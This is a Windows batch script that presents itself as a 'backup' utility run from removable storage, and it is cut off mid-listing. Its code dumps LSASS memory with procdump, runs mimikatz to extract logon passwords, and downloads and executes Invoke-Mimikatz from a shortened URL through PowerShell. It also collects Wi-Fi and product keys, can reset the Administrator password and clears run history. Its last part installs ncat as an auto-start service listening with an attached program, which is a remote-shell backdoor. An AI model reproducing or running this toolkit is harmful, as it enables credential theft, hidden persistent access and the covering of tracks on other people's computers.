@echo off
REM Program version: 2.5, rebuild 3.
REM Change directory to the directory of which this file is located.
%~d0 & CD %~dp0
REM Call default configuration:
call :DT_Configuration_Read
if "%DT_DEBUGGING%"=="TRUE" set CON_WINDOW_TITLE=%CON_WINDOW_TITLE% - DEBUG MODE & Title = %CON_WINDOW_TITLE% & @echo on
call :DT_Determine_System
call :DT_Set_Program_Title_Default
call :DT_Set_Program_CLI_Default
if "%DT_CON_VERIFY_WRITTEN_FILES%"=="TRUE" @verify on
if not "%DT_CON_VERIFY_WRITTEN_FILES%"=="TRUE" @verify off
call :DT_Write_Log "-------------------------------------------------------------------------------------------------------------------"
call :DT_Write_Log "[PROG] Backup started on %COMPUTERNAME%. Program version: %VAR_DT_VER%"
call :DT_Write_Log "[PROG] Checking required directories..."
call :DT_Create_Required_Directories
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%CON_DT_CHECK_RES%"=="TRUE" call :DT_API_CALL "Check_Res_Files"
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" call :DT_Write_Log "[FAIL] An unexpected error occurred so the backup was aborted." & goto DT_The_End_Of_Time
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
REM Begin the backup processes:
if "%CON_DT_BACKUP_SAVED_PASSWORDS%"=="TRUE" call :DT_Backup_Saved_Passwords
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" goto DT_The_End_Of_Time
if "%CON_DT_BACKUP_WIFI_KEYS%"=="TRUE" call :DT_Backup_WiFi_Passwords
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" goto DT_The_End_Of_Time
if "%CON_DT_BACKUP_PRODUCT_KEYS%"=="TRUE" call :DT_Backup_Product_Keys
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" goto DT_The_End_Of_Time
if "%CON_DT_BACKUP_VARIABLE_LISTINGS%"=="TRUE" call :DT_Backup_Variable_Listings
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" goto DT_The_End_Of_Time
if "%CON_DT_BACKUP_DIRECTORY_LISTINGS%"=="TRUE" call :DT_Backup_Directory_Listings
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" goto DT_The_End_Of_Time
if "%CON_DT_LIST_WORKGROUPS_AND_DOMAINS%"=="TRUE" call :DT_Backup_Workgroups_And_Domains
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" goto DT_The_End_Of_Time
if "%CON_DT_CHANGE_ADMIN_PASSWORD%"=="TRUE" call :DT_Write_Log "[PROG] Changing Administrator password..." & NET USER Administrator "%CON_DT_CHANGE_ADMIN_PASSWORD_TO%" & call :DT_Write_Log "[PASS] Execution of NET USER Administrator complete."
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%CON_DT_INIT_USE_SCRIPTS%"=="TRUE" call :DT_Call_Init_Scripts >nul
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" goto DT_The_End_Of_Time
if "%CON_DT_ERASE_RUN_HISTORY%"=="TRUE" call :DT_Write_Log "[PROG] Clearing run history..." & REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /VA /F & "RUNDLL32.EXE" user32.dll,UpdatePerUserSystemParameters & call :DT_Write_Log "[PASS] Clearing of run history complete."
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%CON_DT_NETCAT_USE%"=="TRUE" call :DT_Install_NetCat
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%DT_VAR_ERROR_EXIT%"=="TRUE" goto DT_The_End_Of_Time
if "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY%"=="TRUE" call :DT_Backup_Product_Keys_With_Produkey
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS%"=="TRUE" call :DT_Backup_Windows_Logon_Passwords
%CON_DT_CLEANUP_SCRIPT%
if "%CON_DT_SOUNDPLAY_0%"=="TRUE" call :DT_Play_Sound "%CON_DT_SOUNDWAVFILE_0%" "%CON_DT_SOUNDVBSFILE_0%"
if "%CON_DT_SOUNDPLAY_1%"=="TRUE" call :DT_Play_Sound "%CON_DT_SOUNDWAVFILE_1%" "%CON_DT_SOUNDVBSFILE_1%"
if "%CON_DT_SOUNDPLAY_2%"=="TRUE" call :DT_Play_Sound "%CON_DT_SOUNDWAVFILE_2%" "%CON_DT_SOUNDVBSFILE_2%"
if "%CON_DT_SOUNDPLAY_3%"=="TRUE" call :DT_Play_Sound "%CON_DT_SOUNDWAVFILE_3%" "%CON_DT_SOUNDVBSFILE_3%"
if "%CON_DT_SOUNDPLAY_4%"=="TRUE" call :DT_Play_Sound "%CON_DT_SOUNDWAVFILE_4%" "%CON_DT_SOUNDVBSFILE_4%"
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="1" call :DT_Write_Log "Executing configured exit method: Lock workstation."
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="1" "rundll32.exe" user32.dll, LockWorkStation
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="2" call :DT_Write_Log "Executing configured exit method: Shutdown PC."
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="2" shutdown -s -f -t 3 & goto DT_The_End_Of_Time
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="3" call :DT_Write_Log "Executing configured exit method: Reboot PC."
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="3" shutdown -r -f -t 3 & goto DT_The_End_Of_Time
if "%CON_DT_MESSAGE_SHOW_AFTER_EXECUTION%"=="TRUE" call :DT_Show_Message "%CON_DT_MESSAGE_SHOW_AFTER_EXECUTION_TITLE%" "%CON_DT_MESSAGE_SHOW_AFTER_EXECUTION_MESSAGE%"
if not "%DT_DEBUGGING%"=="TRUE" call :DT_Set_Program_CLI_Default
if "%CON_DT_UNMOUNT_USB_STORAGE%"=="TRUE" call :DT_Unmount_USB_Storage
if "%DT_DEBUGGING%"=="TRUE" pause
goto DT_The_End_Of_Time
REM ---------------------------------------------------------------------------------------------------------------------------------------
REM This is the end of the main script body. The sectors below are classed as "functions" which are executed by the main script.
REM ---------------------------------------------------------------------------------------------------------------------------------------
REM ---------------------------------------------------------------------------------------------------------------------------------------
REM ---------------------------------------------------------------------------------------------------------------------------------------
REM The sectors below are CALLED events and should only be used with the CALL command. Using GOTO will only result in the program exiting.
REM ---------------------------------------------------------------------------------------------------------------------------------------
:DT_Unmount_USB_Storage
if "%VAR_DT_SYSTEM_ARCHITECTURE%"=="32BIT" goto DT_Unmount_USB_Storage_32BIT
if "%VAR_DT_SYSTEM_ARCHITECTURE%"=="64BIT" goto DT_Unmount_USB_Storage_64BIT
goto DT_The_End_Of_Time
:DT_Unmount_USB_Storage_32BIT
call :DT_Write_Log "[PROG/END] Unmounting USB storage..."
if "%SystemDrive%"=="%~d0" call :DT_Write_Log "[FAIL/END] Unable to unmount the USB storage because this script is being ran on the system drive %SystemDrive%." & goto DT_The_End_Of_Time
"%CON_DT_RES_DIRECTORY_ROOT%\RemoveDrive\x32\RemoveDrive.exe" %~d0 -f
goto DT_The_End_Of_Time
:DT_Unmount_USB_Storage_64BIT
call :DT_Write_Log "[PROG/END] Unmounting USB storage..."
if "%SystemDrive%"=="%~d0" call :DT_Write_Log "[FAIL/END] Unable to unmount the USB storage because this script is being ran on the system drive %SystemDrive%." & goto DT_The_End_Of_Time
"%CON_DT_RES_DIRECTORY_ROOT%\RemoveDrive\x64\RemoveDrive.exe" %~d0 -f
goto DT_The_End_Of_Time
:DT_Play_Sound
set VAR_DT_SOUND_FILE=%1
set VAR_DT_SOUND_FILE=%VAR_DT_SOUND_FILE:"=%
if not exist "%VAR_DT_SOUND_FILE%" call :DT_Write_Log "[FAIL] Unable to execute the sound file %VAR_DT_SOUND_FILE%. File not found." & goto DT_The_End_Of_Time
set VAR_DT_VBS_FILE=%2
set VAR_DT_VBS_FILE=%VAR_DT_VBS_FILE:"=%
if exist "%VAR_DT_VBS_FILE%" del /f "%VAR_DT_VBS_FILE%"
@echo Set oVoice = CreateObject("SAPI.SpVoice")> "%VAR_DT_VBS_FILE%"
@echo. >> "%VAR_DT_VBS_FILE%"
@echo set oSpFileStream = CreateObject("SAPI.SpFileStream")>> "%VAR_DT_VBS_FILE%"
@echo. >> "%VAR_DT_VBS_FILE%"
@echo oSpFileStream.Open "%VAR_DT_SOUND_FILE%" >> "%VAR_DT_VBS_FILE%"
@echo. >> "%VAR_DT_VBS_FILE%"
@echo oVoice.SpeakStream oSpFileStream>> "%VAR_DT_VBS_FILE%"
@echo. >> "%VAR_DT_VBS_FILE%"
@echo oSpFileStream.Close>> "%VAR_DT_VBS_FILE%"
if exist "%VAR_DT_VBS_FILE%" call :DT_Write_Log "[PASS/PROG] Successfully wrote the vbs file. Executing sound file..."
if exist "%VAR_DT_VBS_FILE%" wscript "%VAR_DT_VBS_FILE%"
if not exist "%VAR_DT_VBS_FILE%" call :DT_Write_Log "[FAIL] Unable to write the file %VAR_DT_VBS_FILE%. Cannot execute the specified sound file." & goto DT_The_End_Of_Time
call :DT_Write_Log "[PASS] Successfully executed the sound file."
if exist "%VAR_DT_VBS_FILE%" del /f "%VAR_DT_VBS_FILE%"
set VAR_DT_VBS_FILE=
set VAR_DT_SOUND_FILE=
goto DT_The_End_Of_Time
:DT_Show_Message
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ShowMessage\ShowMessage.exe" "%CON_DT_RES_DIRECTORY_ROOT%\ShowMessage\ShowMessage.exe" %1 %2
goto DT_The_End_Of_Time
:DT_Sha1Sum_Check_Compact
if %1=="" goto DT_The_End_Of_Time
if "%1"=="" goto DT_The_End_Of_Time
if %2=="" goto DT_The_End_Of_Time
if "%2"=="" goto DT_The_End_Of_Time
set DT_FILE_TO_CHECK=%1
set DT_FILE_TO_CHECK=%DT_FILE_TO_CHECK:"=%
set DT_FILE_TO_CHECK_EXPECT_SUM=%2
set DT_FILE_TO_CHECK_EXPECT_SUM=%DT_FILE_TO_CHECK_EXPECT_SUM:"=%
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" "%DT_FILE_TO_CHECK%" > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%DT_FILE_TO_CHECK_EXPECT_SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if "%errorlevel%"=="1" (
set DT_VAR_SUM_MATCH=FALSE
)
if "%errorlevel%"=="0" (
set DT_VAR_SUM_MATCH=TRUE
)
goto DT_The_End_Of_Time
:DT_Backup_Windows_Logon_Passwords
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="0" call :DT_Backup_Windows_Passwords_Procdump
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="0" goto the_end_of_time
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="1" call :DT_Backup_Windows_Passwords_Mimikatz
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="1" goto the_end_of_time
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="2" call :DT_Backup_Windows_Passwords_Procdump
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="2" call :DT_Backup_Windows_Passwords_Mimikatz
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD%"=="3" call :DT_Backup_Windows_Passwords_PowerSploit_Mimikatz_RAM_Injection
goto DT_The_End_Of_Time
:DT_Backup_Windows_Passwords_PowerSploit_Mimikatz_RAM_Injection
call :DT_Write_Log "[PROG] Backing up Windows logon passwords via PowerSploit..."
call :DT_Write_Log "[PROG] Setting PowerShell execution policy to 'remotesigned'..."
powershell set-executionpolicy remotesigned
call :DT_Write_Log "[PROG] Downloading and executing Invoke-Mimikatz.ps1..."
powershell "IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds" >> "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%"
if exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%" call :DT_Write_Log "[PASS] Successfully wrote the file %CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%."
goto DT_The_End_Of_Time
:DT_Backup_Windows_Passwords_Procdump
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe"
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" call :DT_Write_Log "[FAIL] Unable to locate the file %CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip! Skipping backup of Windows passwords via procdump." & goto DT_The_End_Of_Time
call :DT_Write_Log "[PROG] Extracting %CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip..."
"%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\Procdump\" -y "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" call :DT_Write_Log "[PASS/PROG] Extraction of %CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip successful. Executing %CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe..."
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" call :DT_Write_Log "[FAIL] Unable to extract procdump.zip. Dumping of lsass.exe aborted." & goto DT_The_End_Of_Time
"%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" -accepteula -ma lsass.exe "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE_DMP%" >nul
call :DT_Write_Log "[PASS] Execution of "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" complete. >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE_DMP%" call :DT_Write_Log "[FAIL] Unable to write the file %CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE_DMP%!"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe"
goto DT_The_End_Of_Time
:DT_Backup_Windows_Passwords_Mimikatz
if "%VAR_DT_SYSTEM_ARCHITECTURE%"=="32BIT" goto DT_Backup_Windows_Passwords_Mimikatz_32BIT
if "%VAR_DT_SYSTEM_ARCHITECTURE%"=="64BIT" goto DT_Backup_Windows_Passwords_Mimikatz_64BIT
goto DT_The_End_Of_Time
:DT_Backup_Windows_Passwords_Mimikatz_32BIT
call :DT_Write_Log "[PROG] Preparing to execute Mimikatz 32BIT..."
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip" call :DT_Write_Log "[FAIL] Unable to locate mimikatz_x32.zip. Execution of Mimikatz aborted." & goto DT_The_End_Of_Time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll"
call :DT_Write_Log "[PROG] Extracting Mimikatz 32BIT..."
"%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\" -y "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" call :DT_Write_Log "[FAIL] Extraction of Mimikatz failed. Unable to locate mimikatz.exe. Execution of Mimikatz aborted." & goto DT_The_End_Of_Time
"%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%"
if not exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%" call :DT_Write_Log "[FAIL] Unable to write the %CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE% file." & goto DT_The_End_Of_Time
if exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%" call :DT_Write_Log "[PASS] Successfully wrote the file %CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%."
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll"
goto DT_The_End_Of_Time
:DT_Backup_Windows_Passwords_Mimikatz_64BIT
call :DT_Write_Log "[PROG] Preparing to execute Mimikatz 64BIT..."
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip" call :DT_Write_Log "[FAIL] Unable to locate mimikatz_x64.zip. Execution of Mimikatz aborted." & goto DT_The_End_Of_Time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\kappfree.dll" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll"
call :DT_Write_Log "[PROG] Extracting Mimikatz 64BIT..."
"%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" x -o"%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\" -y "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip" -p"%VAR_PROGRAM_ARCHIVE_PASSWORD%" >nul
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" call :DT_Write_Log "[FAIL] Extraction of Mimikatz failed. Unable to locate mimikatz_x64.exe. Execution of Mimikatz aborted." & goto DT_The_End_Of_Time
"%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" "privilege::debug" "sekurlsa::logonPasswords full" "exit" >> "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%"
if not exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%" call :DT_Write_Log "[FAIL] Unable to write the %CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE% file." & goto DT_The_End_Of_Time
if exist "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%\%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%" call :DT_Write_Log "[PASS] Successfully wrote the file %CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%."
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\kappfree.dll" del /f "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\kappfree.dll"
goto DT_The_End_Of_Time
:DT_Backup_Product_Keys_With_Produkey
call :DT_Write_Log "[PROG] Backing up product keys with produkey..."
call :DT_Write_Log "[PROG] Extracting produkey..."
if "%VAR_DT_SYSTEM_ARCHITECTURE%"=="64BIT" goto DT_Backup_Product_Keys_With_Produkey_64BIT
call :DT_Extract_Archive "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip" "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\" "%CON_PROGRAM_ARCHIVE_PASSWORD%"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" call :DT_Write_Log "[PASS/PROG] Successfully extracted ProduKey.zip. Executing ProduKey.exe..." & "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" /stab "" >> "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe"
if exist "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%" call :DT_Write_Log "[PASS] Backup of product keys with produkey complete."
goto DT_The_End_Of_Time
:DT_Backup_Product_Keys_With_Produkey_64BIT
call :DT_Extract_Archive "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip" "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\" "%CON_PROGRAM_ARCHIVE_PASSWORD%"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" call :DT_Write_Log "[PASS/PROG] Successfully extracted ProduKeyx64.zip. Executing ProduKeyx64.exe..." & "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" /stab "" >> "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%"
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" del /f "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe"
if exist "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH%\%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE%" call :DT_Write_Log "[PASS] Backup of product keys with produkey complete."
goto DT_The_End_Of_Time
:DT_Install_NetCat
call :DT_Write_Log "[PROG] Installing NetCat..."
if not exist "%CON_DT_RES_DIRECTORY_ROOT%" call :DT_Write_Log "[FAIL] Unable to locate %CON_DT_RES_DIRECTORY_ROOT%. NetCat installation aborted." & goto DT_The_End_Of_Time
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap" call :DT_Write_Log "[FAIL] Unable to locate %CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap. NetCat installation aborted." & goto DT_The_End_Of_Time
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\%CON_DT_NETCAT_NCAT_EXECUTABLE%" call :DT_Write_Log "[FAIL] Unable to locate %CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\%CON_DT_NETCAT_NCAT_EXECUTABLE%. NetCat installation aborted." & goto DT_The_End_Of_Time
if not exist "%CON_DT_NETCAT_COPY_TO_PATH%" mkdir "%CON_DT_NETCAT_COPY_TO_PATH%"
if not exist "%CON_DT_NETCAT_COPY_TO_PATH%" call :DT_Write_Log "[FAIL] Unable to create the directory %CON_DT_NETCAT_COPY_TO_PATH%. NetCat installation aborted." & goto DT_The_End_Of_Time
if exist "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_NCAT_EXECUTABLE%" (
call :DT_Write_Log "[PROG] NetCat already installed. Skipping Installation."
if "%CON_DT_NETCAT_LISTEN_PROGRAM_UPDATE%"=="TRUE" goto DT_Install_NetCat_Update_Components
if not "%CON_DT_NETCAT_LISTEN_PROGRAM_UPDATE%"=="TRUE" goto DT_The_End_Of_Time
)
CD "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap"
call :DT_Write_Log "[PROG] Copying %CON_DT_NETCAT_NCAT_EXECUTABLE% to %CON_DT_NETCAT_COPY_TO_PATH%..."
copy /y "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\%CON_DT_NETCAT_NCAT_EXECUTABLE%" "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_NCAT_EXECUTABLE%"
if not exist "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_NCAT_EXECUTABLE%" call :DT_Write_Log "[FAIL] Unable to copy %CON_DT_NETCAT_NCAT_EXECUTABLE% to %CON_DT_NETCAT_COPY_TO_PATH%. NetCat installation aborted." & goto DT_The_End_Of_Time
call :DT_Write_Log "[PASS] Successfully copied %CON_DT_NETCAT_NCAT_EXECUTABLE% to %CON_DT_NETCAT_COPY_TO_PATH%."
call :DT_Write_Log "[PROG] Installing NetCat startup scripts..."
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_LISTEN_PROGRAM%" call :DT_Write_Log "[FAIL] Unable to locate %CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_LISTEN_PROGRAM%! NetCat installation aborted." & goto DT_The_End_Of_Time
copy /y "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_LISTEN_PROGRAM%" "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_LISTEN_PROGRAM%" >nul
if not exist "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_LISTEN_PROGRAM%" call :DT_Write_Log "[FAIL] Unable to copy %CON_DT_NETCAT_LISTEN_PROGRAM% to %CON_DT_NETCAT_COPY_TO_PATH%. NetCat installation aborted." & goto DT_The_End_Of_Time
if not exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_SERVICE_PROGRAM%" call :DT_Write_Log "[FAIL] Unable to locate %CON_DT_NETCAT_SERVICE_PROGRAM%. NetCat installation aborted." & goto DT_The_End_Of_Time
copy /y "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\%CON_DT_NETCAT_SERVICE_PROGRAM%" "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_SERVICE_PROGRAM%" >nul
if not exist "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_SERVICE_PROGRAM%" call :DT_Write_Log "[FAIL] Unable to copy %CON_DT_NETCAT_SERVICE_PROGRAM% to %CON_DT_NETCAT_COPY_TO_PATH%. NetCat installation aborted." & goto DT_The_End_Of_Time
call :DT_Write_Log "[PROG] Writing NetCat script to %CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_SERVICE_PROGRAM%..."
@echo "%CON_DT_NETCAT_NCAT_EXECUTABLE%" -l -p %CON_DT_NETCAT_LISTEN_PORT% -vv -k -e %CON_DT_NETCAT_LISTEN_PROGRAM% >> "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_SERVICE_PROGRAM%"
if not exist "%CON_DT_NETCAT_COPY_TO_PATH%\1.6_Installed.dat" del /f "%CON_DT_NETCAT_COPY_TO_PATH%\login_conf.dat"
@echo. > "%CON_DT_NETCAT_COPY_TO_PATH%\1.6_Installed.dat"
call :DT_Write_Log "[PASS] NetCat script written."
call :DT_Write_Log "[PROG] Installing service..."
SC DELETE NCAT >nul
TASKKILL /F /IM %CON_DT_NETCAT_NCAT_EXECUTABLE% /T >nul
SC CREATE NCAT binPath= "%CON_DT_NETCAT_COPY_TO_PATH%\%CON_DT_NETCAT_SERVICE_PROGRAM%" start= auto
